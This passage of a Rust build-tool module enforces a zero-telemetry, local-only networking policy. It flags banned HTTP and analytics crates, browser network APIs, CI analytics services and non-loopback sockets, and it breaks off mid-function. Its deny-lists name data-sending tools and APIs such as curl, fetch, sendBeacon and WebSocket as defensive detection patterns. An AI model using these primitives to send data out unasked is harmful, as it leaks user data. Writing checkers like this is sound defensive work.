//! `cargo xtask telemetry`: enforce CurveBook's zero-telemetry, zero-cloud, and local-only
//! networking policy across manifests, Rust sources, workflows, and web security headers (`R0.6`).

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::licenses::{extract_first_quoted, parse_cargo_lock, parse_section_header, strip_toml_comment, unquote_toml_str};
use crate::rust_lex::{RustLexer, StrippedRust, is_ident_byte, strip_non_prod_rust_both as strip_non_prod_rust};

const ALLOWED_LOOPBACK_NET_FILES: &[&str] = &["crates/ui-egui/src/control_io.rs", "crates/mcp/src/tools.rs", "apps/curvebook/src/main.rs"];

const ALWAYS_BANNED_NET_PATTERNS: &[&str] = &[
    "UdpSocket",
    "ToSocketAddrs",
    "core::net",
    "UnixStream",
    "UnixListener",
    "UnixDatagram",
    "web_sys::WebSocket",
    "web_sys::EventSource",
    "web_sys::XmlHttpRequest",
    "web_sys::Request",
    "web_sys::RequestInit",
    "web_sys::RequestMode",
    "web_sys::Response",
    "web_sys::Headers",
    "web_sys::Navigator",
    "web_sys::Worker",
    "web_sys::SharedWorker",
    "web_sys::ServiceWorkerContainer",
    "fetch_with_str",
    "fetch_with_request",
    "fetch_with_request_and_init",
    "send_beacon",
    "send_with_str",
    "send_with_u8_array",
];
const LOOPBACK_SCOPED_NET_PATTERNS: &[&str] = &["TcpStream", "TcpListener", "std::net"];

const BANNED_WEB_SYS_NET_FEATURES: &[&str] = &[
    "websocket",
    "eventsource",
    "xmlhttprequest",
    "request",
    "requestinit",
    "requestmode",
    "response",
    "headers",
    "navigator",
    "worker",
    "sharedworker",
    "serviceworker",
    "beacon",
];

const BANNED_WEB_AND_WORKFLOW_TERMS: &[&str] = &[
    "sonarcloud",
    "sonarsource",
    "sonar_token",
    "codecov",
    "coveralls",
    "googletagmanager",
    "google-analytics",
    "gtag(",
    "plausible",
    "posthog",
    "mixpanel",
    "amplitude",
    "sentry",
    "bugsnag",
    "datadog",
    "clarity.ms",
    "hotjar",
    "navigator.sendbeacon",
    "sendbeacon",
    "xmlhttprequest",
    "new websocket",
    "eventsource",
    "new worker",
    "new sharedworker",
    "serviceworker",
    "new image",
];

const ALLOWED_HTML_EXTERNAL_URLS: &[&str] = &["http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml"];

const REQUIRED_CSP_DIRECTIVES: &[&str] =
    &["default-src 'self'", "connect-src 'self'", "object-src 'none'", "frame-ancestors 'none'", "base-uri 'self'", "form-action 'none'"];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TelemetryViolation {
    pub check: u8,
    pub path: String,
    pub line: usize,
    pub detail: String,
}

impl std::fmt::Display for TelemetryViolation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}:{}: [check-{}] {}", self.path, self.line, self.check, self.detail)
    }
}

#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct TelemetryStats {
    pub manifests: usize,
    pub lock_packages: usize,
    pub rust_sources: usize,
    pub web_and_workflow_files: usize,
    pub workflows: usize,
    pub header_configs: usize,
}

/// Execute `cargo xtask telemetry`.
pub fn run(root: &Path, args: &[String]) -> Result<(), String> {
    if !args.is_empty() {
        return Err(format!("usage: cargo xtask telemetry (unexpected args: `{}`)", args.join(" ")));
    }
    let (stats, violations) = run_checks(root)?;
    if violations.is_empty() {
        println!(
            "telemetry: 0 violations across checks 1-5 ({} manifests, {} locked packages, {} Rust sources, {} web/workflow/packaging files, {} workflows, {} header configs)",
            stats.manifests, stats.lock_packages, stats.rust_sources, stats.web_and_workflow_files, stats.workflows, stats.header_configs
        );
        return Ok(());
    }
    let lines: Vec<String> = violations.iter().map(ToString::to_string).collect();
    Err(format!("{} zero-telemetry violation(s) found:\n  {}", violations.len(), lines.join("\n  ")))
}

/// Run all five zero-telemetry policy checks against `root`.
pub fn run_checks(root: &Path) -> Result<(TelemetryStats, Vec<TelemetryViolation>), String> {
    let mut stats = TelemetryStats::default();
    let mut violations = Vec::new();

    stats.manifests = check_banned_crates(root, &mut violations, &mut stats.lock_packages)?;
    stats.rust_sources = check_rust_network_primitives(root, &mut violations)?;
    stats.web_and_workflow_files = check_web_and_workflow_telemetry(root, &mut violations)?;
    stats.workflows = check_workflow_security(root, &mut violations)?;
    stats.header_configs = check_web_security_headers(root, &mut violations)?;

    violations.sort_by(|a, b| a.check.cmp(&b.check).then_with(|| a.path.cmp(&b.path)).then_with(|| a.line.cmp(&b.line)));
    Ok((stats, violations))
}

/// Check 1: scan all workspace `Cargo.toml` manifests and `Cargo.lock` for banned crates.
fn check_banned_crates(root: &Path, violations: &mut Vec<TelemetryViolation>, lock_count: &mut usize) -> Result<usize, String> {
    let mut manifests = Vec::new();
    collect_files_named(root, "Cargo.toml", &mut manifests)?;
    manifests.sort();
    if manifests.is_empty() {
        return Err(String::from("no Cargo.toml manifests found in workspace"));
    }

    for manifest in &manifests {
        let rel = rel_slash(root, manifest);
        let text = std::fs::read_to_string(manifest).map_err(|e| format!("{rel}: {e}"))?;
        scan_manifest_for_banned_crates(&rel, &text, violations);
    }

    let lock_path = root.join("Cargo.lock");
    let lock_text = std::fs::read_to_string(&lock_path).map_err(|e| format!("Cargo.lock: {e}"))?;
    let lock_pkgs = parse_cargo_lock(&lock_text);
    *lock_count = lock_pkgs.len();
    scan_lock_for_banned_crates(&lock_text, &lock_pkgs, violations);

    Ok(manifests.len())
}

fn scan_manifest_for_banned_crates(rel: &str, toml: &str, violations: &mut Vec<TelemetryViolation>) {
    let mut section = String::new();
    let mut brace_depth = 0i32;
    let mut bracket_depth = 0i32;
    let mut in_dep_inline = false;
    let mut in_web_sys_entry = false;

    for (idx, raw) in toml.lines().enumerate() {
        let line_no = idx + 1;
        let line = strip_toml_comment(raw).trim();
        if line.is_empty() {
            continue;
        }
        if brace_depth <= 0 && bracket_depth <= 0 {
            in_dep_inline = false;
            in_web_sys_entry = false;
            if let Some(sec) = parse_section_header(line) {
                section = sec.to_owned();
                if let Some(dep_name) = section_dependency_name(&section)
                    && is_banned_crate_name(dep_name)
                {
                    violations.push(TelemetryViolation {
                        check: 1,
                        path: rel.to_owned(),
                        line: line_no,
                        detail: format!("banned telemetry/HTTP crate `{dep_name}` in section `[{section}]`"),
                    });
                }
                continue;
            }
        }
        if !is_dependency_section(&section) {
            update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
            continue;
        }

        if brace_depth > 0 || bracket_depth > 0 {
            if in_dep_inline
                && let Some(pkg) = extract_inline_package_name(line, true)
                && is_banned_crate_name(&pkg)
            {
                violations.push(TelemetryViolation {
                    check: 1,
                    path: rel.to_owned(),
                    line: line_no,
                    detail: format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"),
                });
            }
            if in_web_sys_entry {
                for feat in extract_banned_web_sys_features(line) {
                    violations.push(TelemetryViolation {
                        check: 1,
                        path: rel.to_owned(),
                        line: line_no,
                        detail: format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"),
                    });
                }
            }
            update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
            if brace_depth <= 0 && bracket_depth <= 0 {
                in_dep_inline = false;
                in_web_sys_entry = false;
            }
            continue;
        }

        let Some((lhs, rhs)) = line.split_once('=') else {
            update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
            continue;
        };
        let key = unquote_toml_str(lhs.trim());
        let rhs = rhs.trim();
        let is_web_sys_section =
            section_dependency_name(&section).is_some_and(|n| n.eq_ignore_ascii_case("web-sys") || n.eq_ignore_ascii_case("web_sys"));
        if key != "package" && is_banned_crate_name(&key) {
            violations.push(TelemetryViolation {
                check: 1,
                path: rel.to_owned(),
                line: line_no,
                detail: format!("banned telemetry/HTTP crate `{key}` in `Cargo.toml`"),
            });
        }
        if (key == "package" && section_dependency_name(&section).is_some()) || rhs.starts_with('{') {
            let pkg_opt = if key == "package" { Some(unquote_toml_str(rhs)) } else { extract_inline_package_name(rhs, false) };
            if let Some(pkg) = pkg_opt
                && is_banned_crate_name(&pkg)
            {
                violations.push(TelemetryViolation {
                    check: 1,
                    path: rel.to_owned(),
                    line: line_no,
                    detail: format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"),
                });
            }
        }
        let is_web_sys_line = key == "web-sys" || key == "web_sys" || (is_web_sys_section && key == "features");
        if is_web_sys_line {
            for feat in extract_banned_web_sys_features(rhs) {
                violations.push(TelemetryViolation {
                    check: 1,
                    path: rel.to_owned(),
                    line: line_no,
                    detail: format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"),
                });
            }
        }
        update_toml_nesting(line, &mut brace_depth, &mut bracket_depth);
        if brace_depth > 0 || bracket_depth > 0 {
            in_dep_inline = rhs.starts_with('{') || brace_depth > 0;
            in_web_sys_entry = is_web_sys_line;
        }
    }
}

fn update_toml_nesting(line: &str, brace_depth: &mut i32, bracket_depth: &mut i32) {
    let mut quote: Option<u8> = None;
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                quote = None;
            }
        } else {
            match b {
                b'"' | b'\'' => quote = Some(b),
                b'{' => *brace_depth += 1,
                b'}' => *brace_depth = (*brace_depth - 1).max(0),
                b'[' => *bracket_depth += 1,
                b']' => *bracket_depth = (*bracket_depth - 1).max(0),
                _ => {}
            }
        }
        i += 1;
    }
}

fn extract_banned_web_sys_features(rhs: &str) -> Vec<String> {
    let mut hits = Vec::new();
    let mut pos = 0usize;
    let bytes = rhs.as_bytes();
    while pos < bytes.len() {
        let q = bytes[pos];
        if (q == b'"' || q == b'\'')
            && let Some(end) = rhs.get(pos + 1..).and_then(|s| s.find(char::from(q)))
        {
            let val = rhs.get(pos + 1..pos + 1 + end).unwrap_or("");
            let lower = val.trim().to_ascii_lowercase();
            if BANNED_WEB_SYS_NET_FEATURES.contains(&lower.as_str()) {
                hits.push(val.trim().to_owned());
            }
            pos = pos + 1 + end + 1;
            continue;
        }
        pos += 1;
    }
    hits
}

fn scan_lock_for_banned_crates(lock_text: &str, lock_pkgs: &[crate::licenses::LockPackage], violations: &mut Vec<TelemetryViolation>) {
    let mut pkg_lines: BTreeMap<String, Vec<usize>> = BTreeMap::new();
    let mut in_pkg = false;
    for (idx, raw) in lock_text.lines().enumerate() {
        let line = raw.trim();
        if line == "[[package]]" {
            in_pkg = true;
            continue;
        }
        if line.starts_with('[') {
            in_pkg = false;
            continue;
        }
        if in_pkg
            && let Some((k, v)) = line.split_once('=')
            && k.trim() == "name"
        {
            let name = unquote_toml_str(v.trim());
            pkg_lines.entry(name).or_default().push(idx + 1);
        }
    }

    for pkg in lock_pkgs {
        if is_banned_crate_name(&pkg.name) {
            let line = pkg_lines.get(&pkg.name).and_then(|v| v.first().copied()).unwrap_or(1);
            violations.push(TelemetryViolation {
                check: 1,
                path: String::from("Cargo.lock"),
                line,
                detail: format!("banned telemetry/HTTP crate `{}` ({}) in Cargo.lock", pkg.name, pkg.version),
            });
        }
    }
}

#[must_use]
pub fn is_banned_crate_name(raw: &str) -> bool {
    let norm = raw.trim().to_ascii_lowercase().replace('_', "-");
    if norm.is_empty() {
        return false;
    }
    const EXACT_ONLY: &[&str] = &["reqwest", "ureq", "hyper", "surf", "isahc", "curl", "attohttpc", "minreq", "awc", "rama"];
    const EXACT_OR_DASH_PREFIX: &[&str] = &["sentry", "opentelemetry", "tracing-opentelemetry"];
    const WILDCARD_PREFIXES: &[&str] =
        &["posthog", "amplitude", "mixpanel", "segment", "bugsnag", "rollbar", "datadog", "newrelic", "honeycomb", "aptabase"];

    EXACT_ONLY.contains(&norm.as_str())
        || EXACT_OR_DASH_PREFIX.iter().any(|p| norm == *p || norm.starts_with(&format!("{p}-")))
        || WILDCARD_PREFIXES.iter().any(|p| norm.starts_with(p))
}

fn section_dependency_name(section: &str) -> Option<&str> {
    for prefix in ["dependencies.", "dev-dependencies.", "build-dependencies.", "workspace.dependencies."] {
        if let Some(rest) = section.strip_prefix(prefix) {
            return rest.split('.').next().filter(|s| !s.is_empty());
        }
    }
    for marker in [".dependencies.", ".dev-dependencies.", ".build-dependencies."] {
        if let Some((_, rest)) = section.split_once(marker) {
            return rest.split('.').next().filter(|s| !s.is_empty());
        }
    }
    None
}

fn is_dependency_section(section: &str) -> bool {
    section == "dependencies"
        || section == "dev-dependencies"
        || section == "build-dependencies"
        || section == "workspace.dependencies"
        || section.ends_with(".dependencies")
        || section.ends_with(".dev-dependencies")
        || section.ends_with(".build-dependencies")
        || section_dependency_name(section).is_some()
}

fn extract_inline_package_name(rhs: &str, inside_inline: bool) -> Option<String> {
    if !inside_inline && !rhs.starts_with('{') {
        return None;
    }
    let mut pos = 0;
    while let Some(rel) = rhs.get(pos..).and_then(|s| s.find("package")) {
        let hit = pos + rel;
        let left_ok = hit == 0 || !is_ident_byte(rhs.as_bytes()[hit - 1]);
        let after = rhs.get(hit + "package".len()..).unwrap_or("");
        let right_ok = after.starts_with(|c: char| c.is_ascii_whitespace() || c == '=');
        if left_ok
            && right_ok
            && let Some((_, val_part)) = after.split_once('=')
        {
            let trimmed = val_part.trim();
            if trimmed.starts_with('"') || trimmed.starts_with('\'') {
                return Some(extract_first_quoted(trimmed));
            }
        }
        pos = hit + 1;
    }
    None
}

/// Check 2: scan non-test Rust sources under `crates/**/src/**/*.rs` and `apps/**/src/**/*.rs`.
fn check_rust_network_primitives(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let mut files = Vec::new();
    for top in ["crates", "apps"] {
        let base = root.join(top);
        if base.is_dir() {
            collect_non_test_src_rs_files(root, &base, &mut files)?;
        }
    }
    files.sort();
    files.dedup();

    for rel in &files {
        let src = std::fs::read_to_string(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
        let stripped = strip_non_prod_rust(&src);
        scan_rust_file_network(rel, &stripped, violations);
    }
    Ok(files.len())
}

fn scan_rust_file_network(rel: &str, stripped: &StrippedRust, violations: &mut Vec<TelemetryViolation>) {
    let (compact_prod, prod_lines) = crate::layers::collapse_colon_whitespace(&stripped.prod_code);
    scan_code_patterns_with_lines(rel, &compact_prod, &prod_lines, 2, ALWAYS_BANNED_NET_PATTERNS, "banned network socket primitive", violations);
    check_rust_network_use_imports(rel, &stripped.prod_code, violations);
    check_js_sys_network_strings(rel, stripped, violations);

    let allowed = ALLOWED_LOOPBACK_NET_FILES.contains(&rel);
    let mut scoped_hits = Vec::new();
    scan_code_patterns_with_lines(
        rel,
        &compact_prod,
        &prod_lines,
        2,
        LOOPBACK_SCOPED_NET_PATTERNS,
        "unapproved std::net / TCP usage",
        &mut scoped_hits,
    );
    collect_scoped_net_use_hits(rel, &stripped.prod_code, &mut scoped_hits);

    if !allowed {
        violations.extend(scoped_hits);
        return;
    }
    check_allowlisted_net_file(rel, stripped, &scoped_hits, violations);
}

fn check_rust_network_use_imports(rel: &str, prod_code: &str, violations: &mut Vec<TelemetryViolation>) {
    const ALWAYS_BANNED_IMPORT_ITEMS: &[&str] = &[
        "std::net::UdpSocket",
        "net::UdpSocket",
        "std::net::ToSocketAddrs",
        "net::ToSocketAddrs",
        "core::net",
        "core::net::*",
        "std::os::unix::net",
        "std::os::unix::net::*",
        "os::unix::net",
        "unix::net",
        "web_sys::WebSocket",
        "web_sys::EventSource",
        "web_sys::XmlHttpRequest",
        "web_sys::Request",
        "web_sys::RequestInit",
        "web_sys::RequestMode",
        "web_sys::Response",
        "web_sys::Headers",
        "web_sys::Navigator",
        "web_sys::Worker",
        "web_sys::SharedWorker",
        "web_sys::ServiceWorkerContainer",
        "web_sys::*",
    ];
    for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
        let mut items = Vec::new();
        crate::layers::expand_use_tree_items("", &stmt, &mut items);
        for item in items {
            let norm = item.path.strip_prefix("::").unwrap_or(&item.path);
            let matched =
                ALWAYS_BANNED_IMPORT_ITEMS.iter().find(|&&p| norm == p).or_else(|| (norm == "web_sys" && item.alias.is_some()).then_some(&"web_sys"));
            if let Some(pat) = matched {
                violations.push(TelemetryViolation {
                    check: 2,
                    path: rel.to_owned(),
                    line,
                    detail: format!("banned network socket primitive import `{pat}`"),
                });
                continue;
            }
            if ["std::net::", "core::net::", "std::os::unix::net::", "web_sys::"].iter().any(|p| norm.starts_with(p))
                && norm.rsplit("::").next().is_some_and(|leaf| {
                    matches!(
                        leaf,
                        "UdpSocket"
                            | "ToSocketAddrs"
                            | "UnixStream"
                            | "UnixListener"
                            | "UnixDatagram"
                            | "WebSocket"
                            | "EventSource"
                            | "XmlHttpRequest"
                            | "Request"
                            | "RequestInit"
                            | "RequestMode"
                            | "Response"
                            | "Headers"
                            | "Navigator"
                            | "Worker"
                            | "SharedWorker"
                            | "ServiceWorkerContainer"
                    )
                })
            {
                violations.push(TelemetryViolation {
                    check: 2,
                    path: rel.to_owned(),
                    line,
                    detail: format!("banned network socket primitive import `{norm}`"),
                });
            }
        }
    }
}

fn collect_scoped_net_use_hits(rel: &str, prod_code: &str, out: &mut Vec<TelemetryViolation>) {
    for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
        let mut items = Vec::new();
        crate::layers::expand_use_tree_items("", &stmt, &mut items);
        for item in items {
            let norm = item.path.strip_prefix("::").unwrap_or(&item.path);
            if norm == "std::net" || norm == "std::net::*" || norm.starts_with("std::net::") {
                out.push(TelemetryViolation { check: 2, path: rel.to_owned(), line, detail: format!("unapproved std::net / TCP usage `{norm}`") });
            }
        }
    }
}

fn check_js_sys_network_strings(rel: &str, stripped: &StrippedRust, violations: &mut Vec<TelemetryViolation>) {
    let uses_wasm_bridge =
        stripped.prod_code.contains("js_sys") || stripped.prod_code.contains("web_sys") || stripped.prod_code.contains("wasm_bindgen");
    if !uses_wasm_bridge {
        return;
    }
    for (line_no, raw_lit) in extract_rust_string_literals(&stripped.no_comments_code) {
        let lower = raw_lit.trim().to_ascii_lowercase();
        if let Some(matched) = find_banned_js_network_in_literal(&lower) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: line_no,
                detail: format!("forbidden JS network reflection string `{matched}` in WASM source"),
            });
        }
    }
}

fn find_banned_js_network_in_literal(lower: &str) -> Option<&'static str> {
    for (needle, need_boundary) in [
        ("fetch_with_request_and_init", true),
        ("fetch_with_request", true),
        ("fetch_with_str", true),
        ("fetch", true),
        ("sendbeacon", true),
        ("send_beacon", true),
        ("websocket", true),
        ("eventsource", true),
        ("xmlhttprequest", true),
    ] {
        let mut pos = 0usize;
        while let Some(rel) = lower.get(pos..).and_then(|s| s.find(needle)) {
            let hit = pos + rel;
            let end = hit + needle.len();
            let left_ok = !need_boundary || hit == 0 || !is_ident_byte(lower.as_bytes()[hit - 1]);
            let right_ok = !need_boundary || end == lower.len() || !is_ident_byte(lower.as_bytes()[end]);
            if left_ok && right_ok {
                return Some(needle);
            }
            pos = hit + 1;
        }
    }
    None
}

fn extract_rust_string_literals(src: &str) -> Vec<(usize, String)> {
    let mut lex = RustLexer::new(src);
    let mut lits = Vec::new();
    while !lex.is_eof() {
        if lex.try_read_comment().is_some() {
            continue;
        }
        if let Some(lit) = lex.try_read_raw_string() {
            lits.push((lit.start_line, lit.text));
            continue;
        }
        if lex.try_skip_char_literal() {
            continue;
        }
        if let Some(lit) = lex.try_read_quoted_string() {
            lits.push((lit.start_line, lit.text));
            continue;
        }
        lex.advance_one();
    }
    lits
}

fn check_allowlisted_net_file(rel: &str, stripped: &StrippedRust, scoped_hits: &[TelemetryViolation], violations: &mut Vec<TelemetryViolation>) {
    check_net_alias_imports(rel, &stripped.prod_code, violations);

    let fn_spans = collect_rust_fn_spans(&stripped.prod_code);
    let mut checked_fn_sockets = 0usize;
    for (start, end, line_no) in fn_spans {
        let Some(fn_prod) = stripped.prod_code.get(start..end) else {
            continue;
        };
        if !fn_opens_socket(fn_prod) {
            continue;
        }
        checked_fn_sockets += 1;
        let fn_lits = stripped.no_comments_code.get(start..end).unwrap_or(fn_prod);
        if !slice_has_loopback_guard(fn_prod, fn_lits) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from(
                    "allowlisted network function lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
                ),
            });
        }
        if let Some((ip_line, bad_ip)) = find_non_loopback_ip_literal(fn_lits, line_no) {
            violations.push(TelemetryViolation {
                check: 2,
                path: rel.to_owned(),
                line: ip_line,
                detail: format!("non-loopback socket literal `{bad_ip}` in allowlisted network function"),
            });
        }
    }

    if checked_fn_sockets == 0 && !scoped_hits.is_empty() && !slice_has_loopback_guard(&stripped.prod_code, &stripped.no_comments_code) {
        violations.push(TelemetryViolation {
            check: 2,
            path: rel.to_owned(),
            line: scoped_hits.first().map_or(1, |v| v.line),
            detail: String::from(
                "allowlisted network module lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
            ),
        });
    }
}

fn check_net_alias_imports(rel: &str, prod_code: &str, violations: &mut Vec<TelemetryViolation>) {
    for (line, stmt) in crate::layers::collect_use_statements(prod_code) {
        let mut items = Vec::new();
        crate::layers::expand_use_tree_items("", &stmt, &mut items);
        for item in items {
            let norm = item.path.strip_prefix("::").unwrap_or(&item.path);
            let is_net_wildcard_or_alias =
                norm == "std::net::*" || (norm == "std::net" && item.alias.is_some()) || (norm.starts_with("std::net::") && item.alias.is_some());
            if is_net_wildcard_or_alias {
                violations.push(TelemetryViolation {
                    check: 2,
                    path: rel.to_owned(),
                    line,
                    detail: String::from("aliasing or wildcard-importing `std::net` is forbidden in allowlisted files"),
                });
            }
        }
    }
}

fn collect_rust_fn_spans(prod_code: &str) -> Vec<(usize, usize, usize)> {
    let bytes = prod_code.as_bytes();
    let mut spans = Vec::new();
    let mut i = 0usize;
    let mut line = 1usize;
    while i < bytes.len() {
        if bytes[i] == b'\n' {
            line += 1;
            i += 1;
            continue;
        }
        let is_fn =
            bytes[i..].starts_with(b"fn") && (i == 0 || !is_ident_byte(bytes[i - 1])) && bytes.get(i + 2).is_some_and(|b| b.is_ascii_whitespace());
        if !is_fn {
            i += 1;
            continue;
        }
        let fn_start = i;
        let fn_line = line;
        if let Some(body_open) = find_fn_body_open(bytes, i + 2) {
            let mut depth = 1usize;
            let mut p = body_open + 1;
            while p < bytes.len() && depth > 0 {
                match bytes[p] {
                    b'{' => depth += 1,
                    b'}' => depth -= 1,
                    _ => {}
                }
                p += 1;
            }
            spans.push((fn_start, p, fn_line));
        }
        i += 2;
    }
    spans
}

fn find_fn_body_open(bytes: &[u8], mut p: usize) -> Option<usize> {
    while p < bytes.len() && bytes[p].is_ascii_whitespace() {
        p += 1;
    }
    if p >= bytes.len() || !is_ident_byte(bytes[p]) {
        return None;
    }
    while p < bytes.len() && is_ident_byte(bytes[p]) {
        p += 1;
    }
    let mut paren_depth = 0usize;
    let mut bracket_depth = 0usize;
    let mut angle_depth = 0usize;
    let mut saw_params = false;
    while p < bytes.len() {
        match bytes[p] {
            b';' if paren_depth == 0 && bracket_depth == 0 && angle_depth == 0 => return None,
            b'(' => {
                if paren_depth == 0 && bracket_depth == 0 && angle_depth == 0 {
                    saw_params = true;
                }
                paren_depth += 1;
            }
            b')' => paren_depth = paren_depth.saturating_sub(1),
            b'[' => bracket_depth += 1,
            b']' => bracket_depth = bracket_depth.saturating_sub(1),
            b'<' if paren_depth == 0 && bracket_depth == 0 => angle_depth += 1,
            b'>' if paren_depth == 0 && bracket_depth == 0 && angle_depth > 0 && bytes.get(p.wrapping_sub(1)) != Some(&b'-') => {
                angle_depth -= 1;
            }
            b'{' if saw_params && paren_depth == 0 && bracket_depth == 0 && angle_depth == 0 => return Some(p),
            b'{' => {
                let mut brace_depth = 1usize;
                p += 1;
                while p < bytes.len() && brace_depth > 0 {
                    match bytes[p] {
                        b'{' => brace_depth += 1,
                        b'}' => brace_depth -= 1,
                        _ => {}
                    }
                    p += 1;
                }
                continue;
            }
            _ => {}
        }
        p += 1;
    }
    None
}

fn fn_opens_socket(fn_prod: &str) -> bool {
    let (compact, _) = crate::layers::collapse_colon_whitespace(fn_prod);
    compact.contains("TcpListener::bind")
        || compact.contains("TcpStream::connect")
        || ((compact.contains("TcpListener") || compact.contains("TcpStream") || compact.contains("std::net"))
            && (compact.contains("::bind(") || compact.contains("::connect(") || compact.contains("connect_timeout(")))
}

fn slice_has_loopback_guard(prod_code: &str, no_comments_code: &str) -> bool {
    let compact: String = prod_code.chars().filter(|c| !c.is_whitespace()).collect();
    if compact.contains(".is_loopback()") || compact.contains("validate_loopback_addr(") || compact.contains("bind_control_tcp_listener(") {
        return true;
    }
    let has_loopback_addr_ctor = compact.contains("SocketAddr::from(([127,0,0,1],")
        || compact.contains("SocketAddrV4::new(Ipv4Addr::LOCALHOST,")
        || compact.contains("SocketAddr::from((Ipv4Addr::LOCALHOST,")
        || compact.contains("SocketAddr::from((IpAddr::V4(Ipv4Addr::LOCALHOST),")
        || compact.contains("SocketAddr::from((Ipv6Addr::LOCALHOST,")
        || compact.contains("::bind((Ipv4Addr::LOCALHOST,")
        || compact.contains("::connect((Ipv4Addr::LOCALHOST,")
        || compact.contains("::bind(([127,0,0,1],")
        || compact.contains("::connect(([127,0,0,1],");
    if has_loopback_addr_ctor {
        return true;
    }
    for line in no_comments_code.lines() {
        let in_socket_ctx = line.contains("TcpListener")
            || line.contains("TcpStream")
            || line.contains("SocketAddr")
            || line.contains("bind(")
            || line.contains("connect")
            || line.contains(".parse");
        if in_socket_ctx && (line.contains("\"127.0.0.1") || line.contains("\"::1") || line.contains("\"[::1]")) {
            return true;
        }
    }
    false
}

fn find_non_loopback_ip_literal(fn_lits: &str, base_line: usize) -> Option<(usize, String)> {
    for (rel_line, lit) in extract_rust_string_literals(fn_lits) {
        if let Some(bad) = check_non_loopback_host_or_ip(&lit) {
            return Some((base_line + rel_line.saturating_sub(1), bad));
        }
    }
    None
}

fn check_non_loopback_host_or_ip(lit: &str) -> Option<String> {
    let trimmed = lit.trim();
    if trimmed.is_empty() {
        return None;
    }
    if let Ok(sock) = trimmed.parse::<std::net::SocketAddr>() {
        return (!sock.ip().is_loopback()).then(|| trimmed.to_owned());
    }
    if let Ok(ip) = trimmed.parse::<std::net::IpAddr>() {
        return (!ip.is_loopback()).then(|| trimmed.to_owned());
    }
    let inner = trimmed.strip_prefix('[').and_then(|s| s.strip_suffix(']')).unwrap_or(trimmed);
    if let Ok(ip) = inner.parse::<std::net::IpAddr>() {
        return (!ip.is_loopback()).then(|| trimmed.to_owned());
    }
    if let Some((host, port)) = trimmed.rsplit_once(':')
        && port.parse::<u16>().is_ok()
    {
        let clean_host = host.strip_prefix('[').and_then(|s| s.strip_suffix(']')).unwrap_or(host);
        if let Ok(ip) = clean_host.parse::<std::net::IpAddr>() {
            return (!ip.is_loopback()).then(|| trimmed.to_owned());
        }
        if !clean_host.is_empty()
            && !clean_host.eq_ignore_ascii_case("localhost")
            && clean_host.contains('.')
            && clean_host.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
            && clean_host.bytes().any(|b| b.is_ascii_alphabetic())
        {
            return Some(trimmed.to_owned());
        }
    }
    None
}

fn scan_code_patterns_with_lines(
    rel: &str,
    code: &str,
    line_of_byte: &[usize],
    check: u8,
    patterns: &[&'static str],
    reason: &str,
    violations: &mut Vec<TelemetryViolation>,
) {
    let mut pos = 0usize;
    while pos < code.len() {
        if let Some((hit_pos, pat)) = next_ident_pattern_match(code, pos, patterns) {
            let line = line_of_byte.get(hit_pos).copied().unwrap_or(1);
            violations.push(TelemetryViolation { check, path: rel.to_owned(), line, detail: format!("{reason} `{pat}`") });
            pos = hit_pos + pat.len();
        } else {
            break;
        }
    }
}

fn collect_non_test_src_rs_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))?;
    for entry in entries {
        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
        let path = entry.path();
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if ft.is_dir() {
            if name_str == "target" || name_str == "dist" || name_str == "corpus" || name_str.starts_with('.') {
                continue;
            }
            collect_non_test_src_rs_files(root, &path, out)?;
        } else if ft.is_file() && path.extension().and_then(|e| e.to_str()) == Some("rs") {
            let rel = rel_slash(root, &path);
            let is_prod_src = rel.contains("/src/") && !rel.contains("/tests/") && !rel.ends_with("_test.rs");
            let is_build_rs = rel == "build.rs" || rel.ends_with("/build.rs");
            if is_prod_src || is_build_rs {
                out.push(rel);
            }
        }
    }
    Ok(())
}

/// Check 3: scan `.github/{workflows,actions}/*.{yml,yaml}`, `apps/curvebook-web/**`, and `packaging/**` for
/// telemetry/analytics/cloud-service markers and external URLs / browser network APIs across web assets.
fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let mut targets = collect_workflow_and_action_files(root)?;
    for dir_name in ["apps/curvebook-web", "packaging"] {
        let dir = root.join(dir_name);
        if std::fs::symlink_metadata(&dir).is_ok_and(|m| m.is_dir()) {
            collect_all_files_under(root, &dir, &mut targets)?;
        }
    }
    targets.sort();
    targets.dedup();

    let mut scanned = 0usize;
    let mut web_asset_files = Vec::new();
    for rel in &targets {
        let bytes = std::fs::read(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
        let text = match crate::text_decode::decode_utf8_or_utf16(&bytes) {
            Ok(Some(decoded)) => decoded,
            _ => {
